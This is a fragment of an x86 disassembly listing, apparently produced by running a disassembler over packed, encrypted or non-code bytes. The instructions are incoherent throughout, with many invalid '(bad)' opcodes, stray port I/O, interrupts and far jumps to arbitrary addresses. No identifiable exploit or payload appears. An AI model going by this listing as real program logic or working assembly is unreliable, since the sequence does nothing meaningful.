  413446:	adc    eax,0x3b979cb
  41344b:	mov    cl,bl
  41344d:	inc    sp
  41344f:	xor    al,0xf9
  413451:	int3   
  413452:	test   BYTE PTR [ebp-0x5cacc85b],0x1e
  413459:	inc    esi
  41345a:	pop    esi
  41345b:	mov    ah,0xb
  41345d:	adc    esi,DWORD PTR [edx]
  41345f:	sub    al,BYTE PTR [ebx-0xe02f1c9]
  413465:	fcomp  DWORD PTR [edi]
  413467:	int    0x36
  413469:	aaa    
  41346a:	je     0x4133f2
  41346c:	push   0x588fd3ce
  413471:	or     bh,BYTE PTR [ebx+edx*2+0x57]
  413475:	mov    cl,0x74
  413477:	out    0x59,eax
  413479:	(bad)  
  41347a:	pushf  
  41347b:	cli    
  41347c:	fld    TBYTE PTR [ebp-0x35]
  41347f:	stos   BYTE PTR es:[edi],al
  413480:	int    0xf8
  413482:	mov    bl,0xf6
  413484:	cli    
  413485:	fs out dx,al
  413487:	popf   
  413488:	cmp    al,0xeb
  41348a:	out    0x4b,eax
  41348c:	push   edx
  41348d:	rol    DWORD PTR [esi+0xa],cl
  413490:	stos   BYTE PTR es:[di],al
  413492:	in     eax,0x4c
  413494:	popf   
  413495:	jne    0x4134aa
  413497:	or     al,0x74
  413499:	dec    ebp
  41349a:	dec    ebp
  41349b:	mov    al,ds:0xdb3e99b2
  4134a0:	jb     0x413486
  4134a2:	popf   
  4134a3:	mov    ecx,0x251d48cc
  4134a8:	pop    ds
  4134a9:	repnz cwde 
  4134ab:	pop    ebp
  4134ac:	stos   DWORD PTR es:[edi],eax
  4134ad:	add    DWORD PTR [edi+esi*8-0x9],0x19
  4134b2:	pop    esi
  4134b3:	nop
  4134b4:	movntps XMMWORD PTR [esi],xmm6
  4134b7:	adc    eax,0x5c72c038
  4134bc:	xor    DWORD PTR ds:0x652c9eba,ecx
  4134c2:	xor    al,ah
  4134c4:	(bad)  [edx-0x6b9c4398]
  4134ca:	jmp    0x4134ba
  4134cc:	ins    DWORD PTR es:[edi],dx
  4134cd:	mov    WORD PTR [ecx+0x7a625cdc],es
  4134d3:	sbb    bl,bh
  4134d5:	in     al,0x6
  4134d7:	leave  
  4134d8:	sbb    DWORD PTR [eax+0x13b0b7d],ebp
  4134de:	aas    
  4134df:	popf   
  4134e0:	jae    0x4134d7
  4134e2:	scas   al,BYTE PTR es:[edi]
  4134e3:	test   al,0xa2
  4134e5:	adc    al,0xc
  4134e7:	add    eax,0xcfe9d09d
  4134ec:	sbb    eax,0x16aec2d5
  4134f1:	jnp    0x41347e
  4134f3:	push   esp
  4134f4:	pop    eax
  4134f5:	ficomp DWORD PTR [ebx+0x14e5be3d]
  4134fb:	pop    es
  4134fc:	xchg   esi,eax
  4134fd:	cmp    esi,ecx
  4134ff:	dec    eax
  413500:	or     al,0xa5
  413502:	add    ebx,DWORD PTR [edi+eiz*8-0x12e2317b]
  413509:	leave  
  41350a:	inc    ebx
  41350b:	sub    al,0x52
  41350d:	mov    dl,BYTE PTR [edx-0xf]
  413510:	add    al,0x81
  413512:	test   BYTE PTR [ebx],bl
  413514:	push   0x632a2548
  413519:	sar    ebx,0x12
  41351c:	jg     0x4134ae
  41351e:	push   si
  413520:	sbb    DWORD PTR [edx+0x60],ecx
  413523:	arpl   WORD PTR [edi-0x6c21e96b],sp
  413529:	cli    
  41352a:	sbb    al,0xa7
  41352c:	adc    DWORD PTR [edx-0x1bd4da4b],edi
  413532:	jns    0x4134c7
  413534:	inc    esp
  413535:	dec    ebp
  413536:	iret   
  413537:	adc    al,0x93
  413539:	in     eax,0xc
  41353b:	inc    ebp
  41353c:	shr    ch,0xca
  41353f:	mov    al,0x8d
  413541:	and    al,0xc4
  413543:	add    cl,dh
  413545:	jae    0x413584
  413547:	sub    eax,0x495eb83e
  41354c:	xlat   BYTE PTR ds:[ebx]
  41354d:	fs mov cl,0x24
  413550:	xchg   ecx,eax
  413551:	arpl   WORD PTR [esi+edx*2+0x7f],bx
  413555:	and    BYTE PTR [ebx+0x31],0x6b
  413559:	sbb    ebp,DWORD PTR [edx-0x66]
  41355c:	jle    0x413502
  41355e:	jno    0x4135c1
  413560:	std    
  413561:	ret    
  413562:	adc    DWORD PTR [eax+ebx*4],ebx
  413565:	sbb    BYTE PTR [edx-0x1e8722b9],bh
  41356b:	pop    edi
  41356c:	pop    ebx
  41356d:	xchg   edi,eax
  41356e:	pop    edx
  41356f:	repz sbb eax,0xc7f28d54
  413575:	pushf  
  413576:	adc    ebx,esi
  413578:	in     eax,0x3e
  41357a:	lahf   
  41357b:	int    0xfa
  41357d:	sub    ebx,esi
  41357f:	lock add DWORD PTR [edi+esi*2-0x351bcd58],eax
  413587:	add    al,0xb4
  413589:	pop    esi
  41358a:	fcmovbe st,st(2)
  41358c:	ss jmp 0x490e975c
  413592:	and    ah,BYTE PTR [edi]
  413594:	xchg   ebp,eax
  413595:	mov    eax,ds:0x5248509a
  41359a:	rcl    BYTE PTR [ecx*4-0x3dd23707],0x5a
  4135a2:	loope  0x413571
  4135a4:	fimul  DWORD PTR [edi-0x1c9bea2b]
  4135aa:	into   
  4135ab:	imul   eax,DWORD PTR [ebx+0x3d],0xcfc9717b
  4135b2:	mov    edi,0xb04f99cb
  4135b7:	cwde   
  4135b8:	dec    BYTE PTR [edx+0x7c773808]
  4135be:	dec    edi
  4135bf:	mov    esi,0xae3b98af
  4135c4:	in     al,dx
  4135c5:	mov    ecx,0x7e0e7241
  4135ca:	add    BYTE PTR [esi-0x1c],al
  4135cd:	sub    al,0xc9
  4135cf:	iret   
  4135d0:	mov    edx,DWORD PTR ss:[esi]
  4135d3:	repnz cmp eax,0x12c25418
  4135d9:	test   BYTE PTR [edi-0x5359c731],dl
  4135df:	mov    dl,0xc1
  4135e1:	adc    dl,dh
  4135e3:	cmp    al,BYTE PTR [eax+0x7e]
  4135e6:	mov    ecx,0x4ea249ef
  4135eb:	sbb    eax,0xbb11fbe3
  4135f0:	sahf   
  4135f1:	add    al,0x5d
  4135f3:	in     eax,0xc7
  4135f5:	mov    eax,0xa75dd280
  4135fa:	mov    dl,0x1
  4135fc:	rep stos DWORD PTR es:[edi],eax
  4135fe:	outs   dx,DWORD PTR ds:[esi]
  4135ff:	int3   
  413600:	mov    eax,0x9fba5534
  413605:	jb     0x413591
  413607:	iret   
  413608:	cwde   
  413609:	cmp    edi,DWORD PTR ds:0x7690b3f1
  41360f:	push   ecx
  413610:	mov    ds:0x1489ae4e,al
  413615:	adc    esp,ecx
  413617:	mov    BYTE PTR [esi],bl
  413619:	mov    ch,BYTE PTR [edi-0x4c5ba1ea]
  41361f:	aad    0xe9
  413621:	mov    eax,ds:0xb195c945
  413626:	pop    ebp
  413627:	mov    bl,0x64
  413629:	enter  0xb873,0x33
  41362d:	xor    BYTE PTR [edi+ebx*8-0x6],dh
  413631:	in     ax,0xe3
  413634:	jnp    0x4135f2
  413636:	(bad)  
  413637:	mov    ebp,0x52d11fee
  41363c:	push   es
  41363d:	(bad)  
  41363e:	mov    ds:0xc4240f1e,eax
  413643:	nop
  413644:	cmp    BYTE PTR [edx-0x305cedb3],0x98
  41364b:	test   DWORD PTR [ecx-0x10f22afe],edi
  413651:	scas   eax,DWORD PTR es:[edi]
  413652:	cmp    BYTE PTR gs:[edi],ch
  413655:	jnp    0x4135df
  413657:	mov    ds:0xa29b7cad,eax
  41365c:	arpl   WORD PTR [edi+0x7d561310],bp
  413662:	mov    edi,0xd621b816
  413667:	fwait
  413668:	sub    esi,DWORD PTR [esi-0x2e]
  41366b:	mov    edx,0x74f1af9f
  413670:	xchg   ebx,eax
  413671:	out    dx,al
  413672:	or     al,0xec
  413674:	cmc    
  413675:	add    eax,ebx
  413677:	xchg   esi,eax
  413678:	and    ah,BYTE PTR [ecx-0x742c077c]
  41367e:	inc    esi
  41367f:	pop    ss
  413680:	cmp    eax,0x834c4280
  413685:	jnp    0x413647
  413687:	je     0x413612
  413689:	inc    eax
  41368a:	loope  0x413624
  41368c:	xor    ecx,DWORD PTR [eax-0x4b]
  41368f:	sub    cl,BYTE PTR [edx-0x472b3850]
  413695:	and    ecx,edx
  413697:	daa    
  413698:	and    BYTE PTR [eax+0x4ef67d25],0x14
  41369f:	lods   al,BYTE PTR ds:[esi]
  4136a0:	inc    edi
  4136a1:	xchg   esi,eax
  4136a2:	dec    ecx
  4136a3:	sbb    al,bh
  4136a5:	adc    DWORD PTR [ebx+0x21531f0c],0x15
  4136ac:	add    eax,0xd164ea45
  4136b1:	mov    eax,ds:0xa23a0c49
  4136b6:	mov    dh,0xfe
  4136b8:	cmc    
  4136b9:	fwait
  4136ba:	jo     0x413703
  4136bc:	int    0x67
  4136be:	inc    esp
  4136bf:	mov    dh,0x11
  4136c1:	ret    
  4136c2:	cmp    al,0x5d
  4136c4:	dec    ebp
  4136c5:	sbb    edx,DWORD PTR [ebp+ebp*8-0x7a]
  4136c9:	mov    dl,0x2b
  4136cb:	(bad)  [eax]
  4136cd:	jnp    0x41367b
  4136cf:	sbb    esp,0xffffffdb
  4136d2:	imul   eax,DWORD PTR [bx+di],0x6d
  4136d6:	test   BYTE PTR [ecx],ch
  4136d8:	cwde   
  4136d9:	ja     0x4136c6
  4136db:	jnp    0x4136cf
  4136dd:	adc    BYTE PTR ss:[esi],dh
  4136e0:	into   
  4136e1:	push   0xfffffffa
  4136e3:	dec    ecx
  4136e4:	int    0xdd
  4136e6:	push   eax
  4136e7:	pusha  
  4136e8:	mov    eax,ds:0xa5175dc
  4136ed:	push   ecx
  4136ee:	sub    eax,0x7d6ef069
  4136f3:	test   DWORD PTR [esi-0x55],0x64a0f025
  4136fa:	std    
  4136fb:	xor    DWORD PTR [ecx+0x20],ebp
  4136fe:	inc    esp
  4136ff:	jns    0x41372d
  413701:	add    al,0x21
  413703:	inc    DWORD PTR [esi+eiz*2]
  413706:	xchg   esi,eax
  413707:	mul    DWORD PTR [eax]
  413709:	ret    0xed9e
  41370c:	mov    ah,0x78
  41370e:	and    al,0x67
  413710:	push   cs
  413711:	mov    ch,0xf6
  413713:	js     0x4136e9
  413715:	call   0x4a1a:0x6a3c0b28
  41371c:	push   edi
  41371d:	fisub  WORD PTR [ebx-0xa]
  413720:	cwde   
  413721:	fwait
  413722:	fwait
  413723:	sbb    al,0xc6
  413725:	out    dx,eax
  413726:	xor    eax,0x668477c9
  41372b:	cdq    
  41372c:	push   ebx
  41372d:	popa   
  41372e:	xchg   bl,cl
  413730:	mov    eax,ds:0xdb39d069
  413735:	(bad)  
  413736:	(bad)  [edi-0x34]
  413739:	add    ebx,esi
  41373b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41373c:	in     eax,dx
  41373d:	add    DWORD PTR [ecx],ebx
  41373f:	push   edi
  413740:	aad    0xfe
  413742:	dec    edx
  413743:	and    al,0xc8
  413745:	adc    DWORD PTR [esi-0x43],edx
  413748:	cmp    DWORD PTR [edi],eax
  41374a:	adc    BYTE PTR fs:[ebx+0x604918ac],ch
  413751:	psubsw mm6,mm1
  413754:	popa   
  413755:	stos   DWORD PTR es:[edi],eax
  413756:	(bad)  
  413757:	lods   al,BYTE PTR ds:[esi]
  413758:	inc    edx
  413759:	jnp    0x41376f
  41375b:	std    
  41375c:	xchg   ecx,eax
  41375d:	stc    
  41375e:	mov    ebx,0xcd490bbe
  413763:	push   ds
  413764:	sub    ch,BYTE PTR [edx]
  413766:	sbb    ecx,DWORD PTR [ecx-0x53]
  413769:	jmp    0x8e1:0xed8e2040
  413770:	cld    
  413771:	scas   eax,DWORD PTR es:[edi]
  413772:	mov    edx,0xdc06c1bb
  413777:	aad    0xa4
  413779:	into   
  41377a:	mov    al,ds:0xb09d6dc0
  41377f:	(bad)  
  413780:	adc    al,BYTE PTR [esi]
  413782:	ss dec eax
  413784:	add    BYTE PTR [edi],al
  413786:	int    0x2e
  413788:	aas    
  413789:	adc    eax,DWORD PTR [ebp+0x43933220]
  41378f:	clc    
  413790:	ror    BYTE PTR [esi-0x32],1
  413793:	mov    al,dh
  413795:	(bad)  
  413797:	sbb    eax,eax
  413799:	mov    eax,0x26957daa
  41379e:	not    DWORD PTR [edi]
  4137a0:	pop    ebp
  4137a1:	aam    0xe0
  4137a3:	push   esp
  4137a4:	cwde   
  4137a5:	(bad)  
  4137a6:	test   eax,0xdb5f0e28
  4137ab:	mov    dh,al
  4137ad:	or     DWORD PTR [eax-0x7c],ebx
  4137b0:	cmc    
  4137b1:	cmp    eax,DWORD PTR [eax+eax*1-0x7]
  4137b5:	sbb    BYTE PTR [ecx-0xa],dh
  4137b8:	imul   eax,DWORD PTR [esi-0x2b],0x8
  4137bc:	add    DWORD PTR ds:0x59668cd4,edi
  4137c2:	mov    DWORD PTR [eax],edi
  4137c4:	inc    ebp
  4137c5:	popa   
  4137c6:	sub    eax,ebx
  4137c8:	stos   BYTE PTR es:[edi],al
  4137c9:	lea    edx,[esi-0x3786cdbd]
  4137cf:	mov    dl,0x74
  4137d1:	out    dx,al
  4137d2:	mov    dl,0x5b
  4137d4:	sbb    ecx,DWORD PTR [esp+edi*1-0x3e]
  4137d8:	loopne 0x413781
  4137da:	loope  0x413853
  4137dc:	sbb    ebx,DWORD PTR [ebp+0x9a690e9]
  4137e2:	xchg   edx,eax
  4137e3:	cmp    ebx,ebx
  4137e5:	cmp    BYTE PTR ds:0x313ce15d,bl
  4137eb:	dec    esi
  4137ec:	stos   BYTE PTR es:[edi],al
  4137ed:	pop    esi
  4137ee:	mov    WORD PTR [esi],cs
  4137f0:	push   ebx
  4137f1:	adc    eax,0x87835426
  4137f6:	dec    esi
  4137f7:	sbb    BYTE PTR [ecx+0x6bef61e4],0xde
  4137fe:	call   0x62a2395c
  413803:	popf   
  413804:	lods   al,BYTE PTR ds:[esi]
  413805:	ss sub ah,bl
  413808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413809:	jbe    0x413861
  41380b:	lea    edx,[ecx-0x3c]
  41380e:	jg     0x413829
  413810:	rol    BYTE PTR ds:0x3f020f6d,cl
  413816:	pop    es
  413817:	lods   al,BYTE PTR ds:[esi]
  413818:	iret   
  413819:	add    ch,BYTE PTR [edx+0x4c]
  41381c:	(bad)  
  41381d:	(bad)  
  41381e:	sub    al,0xc
  413820:	fdivrp st(4),st
  413822:	mov    al,0x11
  413824:	xchg   edx,eax
  413825:	jg     0x41380d
  413827:	mov    BYTE PTR [ebp+0x5488bc7f],bl
  41382d:	pusha  
  41382e:	mov    edi,0x41bcfd59
  413833:	cwde   
  413834:	xchg   esp,eax
  413835:	inc    ecx
  413836:	das    
  413837:	pop    edi
  413838:	push   esp
  413839:	sub    BYTE PTR [ecx-0x733e83e9],bl
  41383f:	pop    ds
  413840:	ins    BYTE PTR es:[edi],dx
  413841:	xor    DWORD PTR [ecx+0x78],0x6f3e7442
  413848:	mov    esi,0xbb3ca8b9
  41384d:	adc    esi,DWORD PTR [esi]
  41384f:	in     eax,0xda
  413851:	test   al,0xa2
  413853:	outs   dx,DWORD PTR ds:[esi]
  413854:	mov    al,0x1c
  413856:	add    BYTE PTR [edi-0x391d2829],dh
  41385c:	add    BYTE PTR [edx+ecx*4-0xc],cl
  413860:	inc    ebp
  413861:	pop    esi
  413862:	std    
  413863:	push   esi
  413864:	stc    
  413865:	mov    ebp,0x1286ed63
  41386a:	dec    ebp
  41386b:	sub    BYTE PTR [ebx],0x82
  41386e:	mov    esp,0x80fc8249
  413873:	push   ss
  413874:	mov    ds:0xfd38b0fa,eax
  413879:	mov    eax,0xdceb2b44
  41387e:	lds    edi,FWORD PTR [ecx]
  413880:	cwde   
  413881:	mov    ds:0x348c00c6,al
  413886:	out    dx,al
  413887:	out    dx,al
  413888:	pop    eax
  413889:	push   eax
  41388a:	cdq    
  41388b:	add    ch,BYTE PTR [edi-0x7d423801]
  413891:	push   cs
  413892:	scas   al,BYTE PTR es:[edi]
  413893:	or     DWORD PTR [eax-0x1dff57ed],ebx
  413899:	jl     0x413906
  41389b:	add    ch,dl
  41389d:	jne    0x413851
  41389f:	fdivr  DWORD PTR [eax+edx*1+0x636195b1]
  4138a6:	cli    
  4138a7:	shl    DWORD PTR [edi],0xf2
  4138aa:	stos   DWORD PTR es:[edi],eax
  4138ab:	call   0x98b7:0xe259af25
  4138b2:	add    eax,0xd92e8842
  4138b7:	mov    bl,0xc0
  4138b9:	jbe    0x413901
  4138bb:	(bad)  
  4138bc:	js     0x4138e8
  4138be:	repnz or cl,dh
  4138c1:	inc    ecx
  4138c2:	add    al,dl
  4138c4:	lods   al,BYTE PTR ds:[esi]
  4138c5:	dec    ecx
  4138c6:	xor    BYTE PTR [ebp+0xc],0xf2
  4138ca:	xlat   BYTE PTR ds:[ebx]
  4138cb:	push   ebp
  4138cc:	sub    bl,BYTE PTR [edi+0x66cd679]
  4138d2:	loope  0x41389b
  4138d4:	iret   
  4138d5:	adc    edi,esp
  4138d7:	or     ah,ah
  4138d9:	sub    cl,dl
  4138db:	pop    esp
  4138dc:	cmp    DWORD PTR [ebp+eiz*8-0x3d],ebp
  4138e0:	mov    ch,BYTE PTR ds:0xc2f825f8
  4138e6:	pop    edi
  4138e7:	mov    ?,WORD PTR [ebp+0x7008d015]
  4138ed:	pop    es
  4138ee:	add    esp,edi
  4138f0:	mov    ebp,0x8d8a73fb
  4138f5:	and    bl,BYTE PTR [ebp-0x4d]
  4138f8:	icebp  
  4138f9:	outs   dx,DWORD PTR ds:[esi]
  4138fa:	iret   
  4138fb:	aaa    
  4138fc:	adc    DWORD PTR ds:0x2c7836bc,0x7469ba5b
  413906:	cmp    BYTE PTR [ebx],bh
  413908:	out    0xdc,eax
  41390a:	(bad)  
  41390b:	test   al,0x54
  41390d:	xchg   esp,eax
  41390e:	(bad)  
  41390f:	pop    esp
  413910:	repnz ftst 
  413913:	int3   
  413914:	sbb    DWORD PTR [ecx-0x1bb7560c],esp
  41391a:	sbb    ebx,ecx
  41391c:	fadd   DWORD PTR [eax]
  41391e:	imul   ecx,edi,0x14b27b68
  413924:	outs   dx,DWORD PTR ds:[esi]
  413925:	std    
  413926:	and    ecx,eax
  413928:	stos   BYTE PTR es:[edi],al
  413929:	(bad)  
  41392a:	sar    BYTE PTR [edx+0x4f40c9d4],1
  413930:	adc    al,0x19
  413932:	outs   dx,DWORD PTR ds:[esi]
  413933:	arpl   WORD PTR [eax+0x6c],sp
  413936:	adc    edx,ebx
  413938:	int    0x92
  41393a:	cld    
  41393b:	inc    ebp
  41393c:	or     eax,0x33578ab4
  413941:	mov    edi,0xd838cac1
  413946:	int    0x59
  413948:	push   esp
  413949:	xor    ecx,DWORD PTR [eax]
  41394b:	lock mov dl,0x74
  41394e:	sbb    DWORD PTR [edi+ecx*4+0x3f21f5af],ecx
  413955:	das    
  413956:	(bad)
  413959:	and    al,0xdb
  41395b:	pop    edx
  41395c:	div    ch
  41395e:	adc    al,0x1f
  413960:	cwde   
  413961:	push   cs
  413962:	pop    esi
  413963:	rol    BYTE PTR [esi+0x66],0xa3
  413967:	push   si
  413969:	or     eax,0xd4ee7b6
  41396e:	(bad)  
  41396f:	adc    ebp,edi
  413971:	inc    eax
  413972:	mov    ah,0xb2
  413974:	sbb    DWORD PTR [edi-0x73746c33],0xffffffff
  41397b:	jb     0x4139ac
  41397d:	ja     0x413904
  41397f:	push   ds
  413980:	imul   DWORD PTR [esi-0x3f17e84b]
  413986:	or     DWORD PTR ds:0xf70931f8,esi
  41398c:	div    DWORD PTR [ebp+0x79236999]
  413992:	jg     0x4139aa
  413994:	adc    ch,BYTE PTR ds:0x6b4abb75
  41399a:	mov    DWORD PTR [ecx],ebx
  41399c:	loope  0x413985
  41399e:	xor    DWORD PTR [eax+0x2ae16d79],0x7b74dafc
  4139a8:	in     eax,0x0
  4139aa:	popf   
  4139ab:	aas    
  4139ac:	push   ds
  4139ad:	add    dl,dl
  4139af:	imul   BYTE PTR [eax+0x3d392521]
  4139b5:	out    dx,al
  4139b6:	sahf   
  4139b7:	sar    BYTE PTR [ecx],cl
  4139b9:	das    
  4139ba:	ss jecxz 0x413a36
  4139bd:	stos   DWORD PTR es:[edi],eax
  4139be:	adc    ebx,DWORD PTR [esi]
  4139c0:	jne    0x413a36
  4139c2:	cmp    ch,0xb6
  4139c5:	sub    BYTE PTR [ecx],ch
  4139c7:	jns    0x413a3a
  4139c9:	ror    DWORD PTR [eax-0x7f60f705],0xb6
  4139d0:	mov    esi,0x33a84a12
  4139d5:	imul   edx,ebx,0xa5a3e261
  4139db:	out    dx,al
  4139dc:	sbb    DWORD PTR [ebp+0x748e4bfb],0xffffffd5
  4139e3:	out    0xee,eax
  4139e5:	dec    eax
  4139e6:	push   edx
  4139e7:	ins    DWORD PTR es:[edi],dx
  4139e8:	mov    ecx,0x8cbd3c6
  4139ed:	mov    esi,0x2f3c7ef7
  4139f2:	test   DWORD PTR [ebx+0x4af5c801],ebx
  4139f8:	sbb    al,0xcd
  4139fa:	push   edi
  4139fb:	iret   
  4139fc:	sub    edi,esp
  4139fe:	jmp    DWORD PTR [edi+0x44d63d09]
  413a04:	mov    bl,0x1c
  413a06:	xchg   edi,eax
  413a07:	or     edi,DWORD PTR [eax-0x7d59aec6]
  413a0d:	lods   al,BYTE PTR ds:[esi]
  413a0e:	push   esp
  413a0f:	int    0x77
  413a11:	mov    edi,0xbae235ec
  413a16:	ja     0x413a0d
  413a18:	mov    esp,0x5d1a0981
  413a1d:	jge    0x4139a3
  413a1f:	in     eax,0x97
  413a21:	and    edx,DWORD PTR [ecx]
  413a23:	mov    dl,0x34
  413a25:	mov    eax,0x430bd56c
  413a2a:	lods   al,BYTE PTR ds:[esi]
  413a2b:	aam    0x5c
  413a2d:	pushf  
  413a2e:	inc    ebx
  413a2f:	adc    BYTE PTR [ebx],0x37
  413a32:	mov    esp,0x74bf1260
  413a37:	ret    0xb3ed
  413a3a:	jecxz  0x4139d6
  413a3c:	jb     0x413a20
  413a3e:	loop   0x413ab3
  413a40:	outs   dx,BYTE PTR ds:[esi]
  413a41:	xchg   esi,eax
  413a42:	leave  
  413a43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a44:	nop
  413a45:	outs   dx,DWORD PTR ds:[esi]
  413a46:	ins    BYTE PTR es:[edi],dx
  413a47:	sbb    DWORD PTR [edi+0x39],0x220e9aaa
  413a4e:	int3   
  413a4f:	jno    0x413a0d
  413a51:	adc    DWORD PTR [edi],esi
  413a53:	mov    eax,0x9d9d02db
  413a58:	mov    eax,0x7ed8a388
  413a5d:	xor    dh,bh
  413a5f:	cmp    BYTE PTR [ebx-0x79ff1f0b],ch
  413a65:	and    DWORD PTR [edi+0x3a694dee],eax
  413a6b:	shl    DWORD PTR [eax-0x6],0xee
  413a6f:	imul   edi,DWORD PTR [ebp+eiz*4+0x6286c237],0xffffffe4
  413a77:	push   ds
  413a78:	pop    DWORD PTR [edx]
  413a7a:	loopne 0x413a13
  413a7c:	je     0x413a71
  413a7e:	imul   ecx,DWORD PTR gs:[ebx+0x62],0xffffffc6
  413a83:	mov    WORD PTR [edi+ebp*1+0x5b71978],ds
  413a8a:	imul   esp,DWORD PTR fs:[ebx-0x3a0cfea2],0xdfa31809
  413a95:	pop    ds
  413a96:	and    DWORD PTR [esi+0x20],edi
  413a99:	les    eax,FWORD PTR [esi-0x2b]
  413a9c:	xor    DWORD PTR [ecx+0x2e8a8695],ebx
  413aa2:	mov    edx,0x55ac84be
  413aa7:	stc    
  413aa8:	dec    esi
  413aa9:	pop    edi
  413aaa:	out    dx,al
  413aab:	dec    eax
  413aac:	jmp    0x102f:0xf3dfa47f
  413ab3:	out    0x83,al
  413ab5:	inc    ecx
  413ab6:	xor    BYTE PTR [eax*8+0x50548e43],0x70
  413abe:	ror    edi,0xb
  413ac1:	sbb    DWORD PTR [esi+ebx*1],ecx
  413ac4:	les    esp,FWORD PTR [eax+edi*4+0x3b]
  413ac8:	and    DWORD PTR [edx+edx*2-0x7823dfe6],0xd
  413ad0:	push   esi
  413ad1:	jns    0x413b01
  413ad3:	xchg   edx,eax
  413ad4:	mul    BYTE PTR [edx+0xaddca68]
  413ada:	cdq    
  413adb:	sub    bh,bl
  413add:	jnp    0x413af8
  413adf:	ror    DWORD PTR [eax],cl
  413ae1:	cmp    cl,0xf4
  413ae4:	inc    eax
  413ae5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ae6:	inc    eax
  413ae7:	cmp    BYTE PTR [edi-0x197ac347],bl
  413aed:	in     eax,0xbc
  413aef:	lahf   
  413af0:	scas   al,BYTE PTR es:[edi]
  413af1:	push   eax
  413af2:	pop    eax
  413af3:	mov    ebp,0x57c8ecad
  413af8:	mov    ch,0xae
  413afa:	repnz mov bl,0x51
  413afd:	addr16 cli 
  413aff:	stos   BYTE PTR es:[edi],al
  413b00:	into   
  413b01:	aaa    
  413b02:	push   es
  413b03:	or     al,0x69
  413b05:	xchg   ecx,eax
  413b06:	ja     0x413b07
  413b08:	add    DWORD PTR [eax-0x14],ebp
  413b0b:	inc    ecx
  413b0c:	push   ebx
  413b0d:	dec    edi
  413b0e:	xchg   ecx,eax
  413b0f:	je     0x413b19
  413b11:	int    0x1f
  413b13:	push   ebx
  413b14:	hlt    
  413b15:	push   ebx
  413b16:	sbb    al,0x58
  413b18:	test   al,0xa6
  413b1a:	ja     0x413b8c
  413b1c:	inc    ecx
  413b1d:	sub    BYTE PTR [ebx+eax*4-0x70],cl
  413b21:	push   eax
  413b22:	test   eax,0xb8dc66f2
  413b27:	mov    esi,gs
  413b29:	xor    al,0xb7
  413b2b:	or     eax,0x70a42150
  413b30:	pop    ds
  413b31:	loope  0x413b9c
  413b33:	jg     0x413bb0
  413b35:	sbb    eax,0x9950afd8
  413b3a:	arpl   WORD PTR [ecx],di
  413b3c:	push   esi
  413b3d:	adc    eax,0xfad29628
  413b42:	jp     0x413bbd
  413b44:	ret    0x5265
  413b47:	mov    ebx,0x9f648a8e
  413b4c:	popf   
  413b4d:	(bad)  
  413b4e:	in     al,dx
  413b4f:	lock scas eax,DWORD PTR es:[edi]
  413b51:	mov    ah,0x24
  413b53:	push   edx
  413b54:	sbb    bl,dl
  413b56:	push   es
  413b57:	idiv   DWORD PTR [ecx]
  413b59:	(bad)  
  413b5a:	mov    edi,0xdd2eba09
  413b5f:	dec    ebp
  413b60:	dec    ecx
  413b61:	push   cs
  413b62:	shr    eax,cl
  413b64:	push   edx
  413b65:	(bad)  
  413b66:	stc    
  413b67:	mov    bh,BYTE PTR [ebx+esi*4]
  413b6a:	mov    ecx,0x7e62c55
  413b6f:	push   ecx
  413b70:	in     al,dx
  413b71:	adc    edi,DWORD PTR ds:0x25262412
  413b77:	outs   dx,BYTE PTR ds:[esi]
  413b78:	jns    0x413b1f
  413b7a:	xchg   ebp,eax
  413b7b:	in     eax,0xff
  413b7d:	push   esp
  413b7e:	dec    esp
  413b7f:	(bad)  
  413b80:	and    dh,BYTE PTR [eax]
  413b82:	jns    0x413ba8
  413b84:	xor    DWORD PTR [edi-0x69190811],0xffffffed
  413b8b:	jle    0x413bc9
  413b8d:	mov    dh,BYTE PTR [eax-0x6e]
  413b90:	stos   BYTE PTR es:[edi],al
  413b91:	xor    ch,BYTE PTR [eax]
  413b93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b94:	loopne 0x413c11
  413b96:	inc    ebx
  413b97:	pop    edi
  413b98:	aam    0x52
  413b9a:	je     0x413b84
  413b9c:	mov    al,ds:0x19a7af4c
  413ba1:	iret   
  413ba2:	xchg   esi,eax
  413ba3:	push   ebx
  413ba4:	mov    eax,ds:0xef87c055
  413ba9:	aad    0xba
  413bab:	mov    ecx,0x13f6e282
  413bb0:	lock mov eax,0x531ab203
  413bb6:	imul   ebp,ebx,0x1b
  413bb9:	stos   BYTE PTR es:[edi],al
  413bba:	ins    BYTE PTR es:[edi],dx
  413bbb:	jecxz  0x413b8a
  413bbd:	fisttp DWORD PTR [eax+0x77]
  413bc0:	daa    
  413bc1:	idiv   DWORD PTR fs:[eax+ecx*4+0x54241aa2]
  413bc9:	fimul  DWORD PTR [ebx+0x6b]
  413bcc:	fstp   TBYTE PTR [edi+0x7243f45e]
  413bd2:	inc    ebx
  413bd3:	jl     0x413c09
  413bd5:	sti    
  413bd6:	xor    al,0xa8
  413bd8:	mul    DWORD PTR [eax+0x36da7955]
  413bde:	nop
  413bdf:	mov    dh,0x2d
  413be1:	pop    esp
  413be2:	sti    
  413be3:	and    esp,DWORD PTR [ebx+eax*4-0x4848b056]
  413bea:	gs out dx,al
  413bec:	aad    0x1
  413bee:	jnp    0x413c39
  413bf0:	(bad)  [edi+0xc]
  413bf3:	cmp    edi,edx
  413bf5:	loopne 0x413b9c
  413bf7:	sti    
  413bf8:	add    eax,0xd1d84d04
  413bfd:	into   
  413bfe:	xchg   ecx,eax
  413bff:	sbb    dh,BYTE PTR [edx+0x44]
  413c02:	fld    TBYTE PTR [edx]
  413c04:	xchg   edi,eax
  413c05:	and    DWORD PTR [edi+0x4f],ecx
  413c08:	pushf  
  413c09:	push   es
  413c0a:	jne    0x413c5d
  413c0c:	sub    eax,ebx
  413c0e:	xchg   ecx,eax
  413c0f:	in     al,dx
  413c10:	fbld   TBYTE PTR [edi-0x3bc7df49]
  413c16:	jnp    0x413bee
  413c18:	jb     0x413bee
  413c1a:	add    ah,BYTE PTR [ebx]
  413c1c:	dec    eax
  413c1d:	and    BYTE PTR [edx+0x4626572a],ah
  413c23:	loopne 0x413ca0
  413c25:	mov    al,ds:0x8d18f7b2
  413c2a:	in     eax,0x36
  413c2c:	test   DWORD PTR [ecx],esi
  413c2e:	mov    ch,0xfd
  413c30:	push   ebx
  413c31:	jge    0x413c38
  413c33:	pushf  
  413c34:	hlt    
